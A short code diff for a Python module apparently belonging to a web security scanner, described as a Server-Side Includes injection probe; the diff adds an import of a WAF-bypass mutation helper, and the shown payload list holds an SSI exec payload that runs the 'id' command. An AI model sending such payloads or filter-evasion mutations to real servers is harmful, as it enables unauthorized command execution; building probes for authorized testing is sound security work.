@@ -1,5 +1,6 @@
 """ssi_injection — Server-Side Includes injection probe"""
 from core.http import HttpClient
+from core.waf_bypass import mutate_until_pass
 
 PAYLOADS = [
     '<!--#exec cmd="id"-->',
